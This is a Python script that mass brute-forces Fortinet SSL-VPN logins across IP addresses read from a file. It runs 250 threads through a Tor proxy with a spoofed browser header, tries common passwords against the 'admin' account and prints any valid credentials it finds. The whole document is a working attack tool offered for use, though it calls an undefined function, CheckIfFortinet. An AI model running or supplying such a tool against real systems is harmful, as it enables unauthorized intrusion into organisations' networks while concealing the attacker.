import time
import requests
import threading
from queue import Queue
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

numberOfThreads = 250
timeOut = 10
bruteDelay = 5
port = 443

userNames = { "admin" }
passWords = { "123456", "123456789", "12345", "qwerty", "password", "12345678", "111111", "123123", "1234567890", "1234567", "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", "1234", "qwertyuiop", "123321", "password123" }

proxies = { "http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050" }
headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36" }

ipsQueue = Queue()

def Logout(url, cookies):
    try:
        requests.get(url + "/remote/logout", cookies=cookies, timeout=timeOut, headers=headers, proxies=proxies, verify=False)
    except Exception:
        pass

    return

def CheckIfResponsive(url):
    try:
        response = requests.get(url, timeout=timeOut, headers=headers, proxies=proxies, verify=False)
        if response.status_code == 200:
            return True
    except Exception:
        pass

    return False

def Login(url, userName, passWord):
    try:
        postParameters = { "ajax": '1', "username": userName, "credential": passWord }
        response = requests.post(url + "/remote/logincheck", data=postParameters, timeout=timeOut, headers=headers, proxies=proxies, verify=False)

        if response.status_code == 200 and "redir=" in response.text and "&portal=" in response.text:
            Logout(url, response.cookies)
            return True
    except Exception:
        pass

    return False

def BruteThread(threadId):
    global ipsQueue

    print("Starting thread #" + str(threadId))

    while ipsQueue.qsize() > 0:
        currentIp = ipsQueue.get()
        currentUrl = "https://" + currentIp + ':' + str(port) 

        if not CheckIfFortinet(currentUrl):
            continue

        passwordFound = False
        for userName in userNames:
            if passwordFound:
                break

            for passWord in passWords:
                if passwordFound:
                    break

                if Login(currentUrl, userName, passWord):
                    print("VALID LOGIN: " + currentIp + " | " + userName + ':' + passWord)
                    passwordFound = True

                time.sleep(bruteDelay)

    return


def Main():
    global ipsQueue

    for line in open("ips.txt"):
        ipsQueue.put(line.strip())

    threads = []

    for i in range(numberOfThreads):
        threads.append(threading.Thread(target=BruteThread, args=(i,)))

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    return

if __name__ == "__main__":
    Main()
